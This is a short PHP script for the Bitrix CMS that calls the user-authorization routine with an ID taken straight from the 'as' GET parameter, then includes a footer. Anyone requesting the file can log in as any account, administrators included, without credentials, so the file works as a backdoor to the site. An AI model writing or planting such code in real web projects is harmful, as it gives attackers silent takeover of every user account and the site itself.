<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/bitrix/modules/main/include/prolog_before.php');
/** CMain */
global $USER;

if($_GET['as']){
    $USER->Authorize($_GET['as']);
}

include 'footer.php';